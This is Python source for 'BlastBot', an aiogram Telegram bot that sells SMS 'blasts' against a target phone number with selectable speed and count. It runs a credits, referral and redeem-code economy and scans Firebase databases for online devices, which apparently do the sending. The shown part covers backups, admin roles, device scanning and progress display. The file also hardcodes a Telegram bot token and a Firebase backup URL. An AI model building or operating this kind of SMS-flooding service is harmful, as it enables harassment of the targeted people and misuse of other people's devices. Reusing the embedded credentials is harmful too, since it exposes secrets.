import asyncio, json, os, time, logging, random, string, threading, io, shutil, glob, html, base64, gzip
from datetime import datetime, timezone, timedelta
from urllib.parse import urlparse

_IST = timezone(timedelta(hours=5, minutes=30))  # India Standard Time (UTC+5:30)


def now_ist() -> datetime:
    """Ab bot ke saare timestamps India (IST) time mein — VPS ki timezone se independent."""
    return datetime.now(_IST)


def _human_size(n: int) -> str:
    if n >= 1024 * 1024:
        return f"{n/1024/1024:.1f}MB"
    if n >= 1024:
        return f"{n/1024:.0f}KB"
    return f"{n}B"


_TG_API = "https://api.telegram.org"
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    ErrorEvent
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramConflictError

# ── Global safe-edit: "message is not modified" silently ignore ─────────────
# Jab user baar-baar same button (home/refresh) dabata hai aur content same rehta
# hai, Telegram ye BadRequest deta hai. Ab ye error saare edit_text calls se
# khud swallow ho jata hai (baaki BadRequests waise hi aate hain).
_orig_msg_edit_text = Message.edit_text
async def _safe_msg_edit_text(self, *args, **kwargs):
    try:
        return await _orig_msg_edit_text(self, *args, **kwargs)
    except TelegramBadRequest as _e:
        if "message is not modified" in str(_e):
            return None
        raise
Message.edit_text = _safe_msg_edit_text

_orig_bot_edit_message_text = Bot.edit_message_text
async def _safe_bot_edit_message_text(self, *args, **kwargs):
    try:
        return await _orig_bot_edit_message_text(self, *args, **kwargs)
    except TelegramBadRequest as _e:
        if "message is not modified" in str(_e):
            return None
        raise
Bot.edit_message_text = _safe_bot_edit_message_text

# ========== FILE LOCK FOR RACE CONDITION PROTECTION ==========
_DB_LOCK = threading.Lock()


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "url": url}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    return KeyboardButton(
        text=sc(text),
        style=style if style in ["primary", "success", "danger"] else None,
        request_contact=request_contact,
        request_location=request_location
    )

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

MAIN_OWNER = 8987478830
SUPER_ADMIN_NAME = "@DroidDeveloper"
SUPER_ADMIN_LINK = "https://t.me/DroidDeveloper"
SUPER_ADMINS = [8987478830]

BOT_TOKEN = os.getenv("BOT_TOKEN", "8985037358:AAGLU3RWKj-YZCV4u9Vyensz7dKK64N0uCU")
LOG_CHANNEL_ID = -1003259705330  # log channel (bot ko iska ADMIN banana zaroori hai)

# ── FIREBASE CLOUD BACKUP ────────────────────────────────────────────────
# Apni PUBLIC Firebase RTDB ka URL yahan daalo, e.g.:
# _BACKUP_FB_URL = "https://my-bot-backup-default-rtdb.firebaseio.com"
# Bot ka poora data isme hourly + har 15 min save pe push hota hai;
# restart pe DB missing/corrupt ho toh isi se AUTO-IMPORT hota hai.
# Priority: env BLAST_BACKUP_FB_URL > Owner Panel (backup firebase button) > yahan ka constant
_BACKUP_FB_URL = "https://backup-8c392-default-rtdb.firebaseio.com"

_DATA_FILE = os.environ.get("BLAST_DATA_FILE", "").strip() or "blast_data.json"
# Local backup folder — default: DB file ke same folder.
# Render/VPS pe Persistent Disk ho toh BLAST_BACKUP_DIR us disk ki path par set karo
# (e.g. BLAST_BACKUP_DIR=/var/data) — tab redeploy/restart par bhi backups safe rahenge.
_BACKUP_DIR = os.environ.get("BLAST_BACKUP_DIR", "").strip() or os.path.dirname(os.path.abspath(_DATA_FILE))
try:
    os.makedirs(_BACKUP_DIR, exist_ok=True)
except Exception:
    pass
_SHADOW_BACKUP_INTERVAL = 900.0  # save() ke baad 15 min se purana backup ho toh turant nayi local copy
_LAST_SHADOW_BACKUP_TS = [0.0]
_VERSION = "v3.2-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 86400.0  # 24 ghante — ek din mein sirf 1 baar scan (VPS load kam, 1k+ devices safe)

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

async def send_backup_once(bot: Bot):
    """Ek backup cycle: local copy → GZIP → channel (+file_id manifest) → Firebase cloud backup."""
    # Step 1: PEHLE local backup copy banao — jo file bheji jaayegi wahi recent
    # direct backup hai. Isse channel bhejne mein koi bhi fail hone par bhi
    # local restore point hamesha safe rehta hai.
    local_backup = make_local_backup()
    if not local_backup:
        log.warning("Backup skip: main DB file missing")
        return
    # Step 2: GZIP compress karke channel par bhejo (40MB+ DB bhi chhota file banta hai)
    # + file_id manifest save karo — RESTART PE CHANNEL SE AUTO-IMPORT isi se hota hai
    try:
        raw_size = os.path.getsize(local_backup)
        gz_path = local_backup + ".gz"
        with open(local_backup, "rb") as f_in, gzip.open(gz_path, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
        gz_size = os.path.getsize(gz_path)
        caption_text = (
            f"📦 <b>AUTOMATIC DATABASE BACKUP</b>\n\n"
            f"📅 <b>Date & Time:</b> <code>{now_ist().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"📂 <b>File:</b> <code>{local_backup}</code>\n"
            f"🗜 <b>Size:</b> {_human_size(raw_size)} → <b>{_human_size(gz_size)}</b> (gzip)\n"
            f"\n<i>Import DB button se isi .gz file ko bhej ke import kar sakte ho.</i>"
        )
        doc = await bot.send_document(
            chat_id=LOG_CHANNEL_ID,
            document=FSInputFile(gz_path),
            caption=caption_text,
            parse_mode="HTML"
        )
        log.info(f"Backup sent to log channel: {gz_path} ({_human_size(gz_size)})")
        try:
            _save_channel_backup_ref(doc.document.file_id, doc.message_id, raw_size)
        except Exception as me:
            log.warning(f"Channel backup ref save fail: {me}")
    except Exception as e:
        log.error(f"Failed to send automatic database backup: {e} (local copy safe: {local_backup})")
    # Step 3: Firebase cloud backup (user ki apni Firebase — render-wipe se safe)
    try:
        ok, info = await fb_cloud_backup()
        if ok:
            log.info(f"Firebase cloud backup: {info}")
        elif info != "not_configured":
            log.warning(f"Firebase cloud backup fail: {info}")
    except Exception as e:
        log.error(f"Firebase cloud backup error: {e}")


async def background_backup_sender(bot: Bot):
    log.info("Background JSON Backup Task STARTED")
    while True:
        await asyncio.sleep(3600)
        try:
            await send_backup_once(bot)
        except Exception as e:
            log.error(f"Backup task error: {e}")


def make_local_backup():
    """Latest DB ki local copy banao — yahi recent direct backup hai (auto-restore source).
    Channel upload ke PEHLI likhi jaati hai taaki bhejne mein fail hone par bhi backup safe rahe.
    Return: backup file name, ya None. """
    try:
        if not os.path.exists(_DATA_FILE):
            return None
        name = f"blast_data_backup_{now_ist().strftime('%Y%m%d_%H%M%S')}.json"
        local_backup = os.path.join(_BACKUP_DIR, name)
        shutil.copy2(_DATA_FILE, local_backup)
        # sirf last 7 local backups rakho (backup dir + CWD + script folder)
        for dd in {_BACKUP_DIR, ".", os.path.dirname(os.path.abspath(__file__))}:
            try:
                for old in sorted(glob.glob(os.path.join(dd, "blast_data_backup_*.json")))[:-7]:
                    try:
                        os.remove(old)
                    except OSError:
                        pass
            except Exception:
                pass
        return local_backup
    except Exception as be:
        log.warning(f"Local backup copy failed: {be}")
        return None


async def safe_answer(cq, text=None, show_alert=False):
    """Callback query ka answer — query stale/already-answered ho (VPS slow load pe common)
    toh koi exception na aaye, bot crash na ho. Operation ho chuka hota hai, panel update hi
    confirmation hai. """
    try:
        if text:
            await cq.answer(text, show_alert=show_alert)
        else:
            await cq.answer()
    except Exception:
        pass

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'blast_data']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.blast_data = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
FB_SCAN_STATUS = {}  # per-DB last scan status: {"<fb_id>": "ok:42" | "http:423" | "error:msg"}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    import_db = State()
    fb_editor_url = State()
    fb_editor_menu = State()
    fb_ed_path = State()
    fb_ed_value = State()
    fb_del_path = State()
    set_backup_fb = State()
    daily_reward_amount = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "daily_reward": {"enabled": False, "amount": 10, "last_give": {}}
    }

def load() -> dict:
    global PROTECTED_NUMBERS
    if os.path.exists(_DATA_FILE):
        try:
            with _DB_LOCK:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
                if "manual_added_credits" not in u:
                    u["manual_added_credits"] = 0
            # Load protected numbers from disk into global
            PROTECTED_NUMBERS = data.get("protected_numbers", {})
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)  # lock ke bahar call → koi deadlock nahi
    return d

def save(d: dict):
    with _DB_LOCK:
        # Sync PROTECTED_NUMBERS into data before saving
        d["protected_numbers"] = PROTECTED_NUMBERS
        # Atomic write: pehle .tmp mein, phir rename → power-cut pe bhi file corrupt nahi hogi
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
        # Shadow backup: DB change hote hi (15 min ka gap) local backup refresh karo
        # — restart/redeploy par data-loss window sirf 15 min ki rahe, 1 ghante ki nahi
        # (startup restore ke dauran NAHI — fresh empty DB ki backup agle restart pe poison ban jaati)
        try:
            if not _RESTORE_IN_PROGRESS[0] and time.time() - _LAST_SHADOW_BACKUP_TS[0] >= _SHADOW_BACKUP_INTERVAL:
                if make_local_backup():
                    _LAST_SHADOW_BACKUP_TS[0] = time.time()
        except Exception:
            pass
        # Firebase cloud backup (agar configured) — 15 min gap, background task (save sync hai)
        # ⚠️ restore ke dauran KABHI NAHI — fresh empty DB poora latest backup kha jaata tha (race bug)
        try:
            if (not _RESTORE_IN_PROGRESS[0] and get_backup_fb_url(d)
                    and time.time() - _LAST_FB_BACKUP_TS[0] >= _SHADOW_BACKUP_INTERVAL):
                try:
                    asyncio.get_running_loop().create_task(fb_cloud_backup(d))
                except RuntimeError:
                    pass
        except Exception:
            pass

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "manual_added_credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict, is_manual: bool = False):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "manual_added_credits": 0}
    if "manual_added_credits" not in d["users"][k]:
        d["users"][k]["manual_added_credits"] = 0
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    if is_manual:
        d["users"][k]["manual_added_credits"] += amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ʜᴜᴅ sᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d, is_manual=False)
    add_credits(referrer_uid, ref_credits, d, is_manual=False)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴄʜ ᴍᴇɴ ʀᴏᴋɴᴀ ʜ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    # Scan ab sirf 1 din mein 1 baar hota hai, isliye cached devices hamesha valid hain
    # (pehle har 60s scan hota tha isliye "old" timing dikhti thi)
    return f"{em(EMOJI_CHECK, '🟢')} {len(CACHED_DEVICES)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ᴀsᴛ: {fmt_time(int(LAST_SCAN_TIME))}"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False
    retry_passes = 0  # self-heal re-scan count (healthy scan par reset)

    self_heal_due = False  # rate-limit self-heal re-scan ka bypass flag
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        # 24h ke andar scan ho chuki hai (is process mein ya pehle ke process mein —
        # DB se hydrated) toh skip — har restart/redeploy pe fresh scan nahi chalta (CPU/IO save)
        if not self_heal_due and LAST_SCAN_TIME and (time.time() - LAST_SCAN_TIME) < _BACKGROUND_SCAN_INTERVAL:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            await asyncio.sleep(60)
            continue

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()
            # Persistent scan state — restart/redeploy pe 24h scan skip ho sake (CPU save)
            try:
                d2 = load()
                d2["last_scan"] = {
                    "ts": int(time.time()),
                    "devices": devices[:5000],
                    "fb_counts": {k: v for k, v in FB_DEVICE_COUNTS.items()},
                }
                save(d2)
            except Exception as _e:
                log.warning(f"[BG-SCAN] last_scan persist fail: {_e}")

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
            if not first_scan_done:
                # Pehli scan ki hamesha report — chahe 0 devices hi kyun na milein
                # (Telegram 4096 char limit — 150+ DBs ke liye lines cap + final guard)
                try:
                    status_lines = []
                    for fb in fbs:
                        stt = FB_SCAN_STATUS.get(fb["id"], "unknown")
                        online = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
                        status_lines.append(f"  {fb.get('label', fb['url'][:30])}: <b>{online}</b> online (DB mein {stt})")
                    _MAX_REPORT_LINES = 45
                    if len(status_lines) > _MAX_REPORT_LINES:
                        status_lines = status_lines[:_MAX_REPORT_LINES] + [
                            f"  ... +{len(status_lines) - _MAX_REPORT_LINES} aur DBs (manage firebase se dekho)"
                        ]
                    report = (f"🔍 <b>First scan complete!</b>\n\n"
                              f"{em(EMOJI_PHONE, '📱')} Devices online: <b>{len(devices)}</b>\n"
                              f"{em(EMOJI_FIRE, '🔥')} Firebase DBs: <b>{len(fbs)}</b>\n\n"
                              + "\n".join(status_lines) + "\n\n"
                              f"{em(EMOJI_GEAR, '🔄')} Auto-scan: har 24 ghante (1 din mein 1 baar)\n"
                              "<i>ok:N = DB mein total devices | empty = DB khali | http:423 = Firebase ne rate-limit kiya (agle scan mein retry hota hai)</i>")
                    await bot.send_message(MAIN_OWNER, report[:4000], parse_mode="HTML")
                except Exception as e:
                    log.warning(f"Owner notify failed: {e}")
                first_scan_done = True

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        # Self-heal: agar 50%+ DBs rate-limited (423/429) rahi, toh 2 ghante baad
        # 1 baar re-scan karo (IP thanda ho jaata hai). Max 2 pass — phir normal 24h cycle.
        try:
            cur_fbs = load().get("firebases", [])
            rl = sum(1 for fb in cur_fbs if str(FB_SCAN_STATUS.get(fb["id"], "")).startswith(("http:423", "http:429")))
            if cur_fbs and rl / len(cur_fbs) >= 0.5 and len(cur_fbs) >= 10 and retry_passes < 2:
                retry_passes += 1
                self_heal_due = True  # 2h baad 24h-window ko bypass karke scan karega
                log.warning(f"[BG-SCAN] {rl}/{len(cur_fbs)} DBs rate-limited — 2 ghante baad self-heal re-scan (pass {retry_passes}/2)")
                SCAN_STATUS = f"{em(EMOJI_WARNING, '🕒')} ʀᴀᴛᴇ-ʟɪᴍᴛᴇᴅ — 2ʜ ʙᴀᴅ ʀᴇ-ꜱᴄᴀɴ"
                await asyncio.sleep(7200)
                continue
        except Exception:
            pass
        self_heal_due = False
        retry_passes = 0
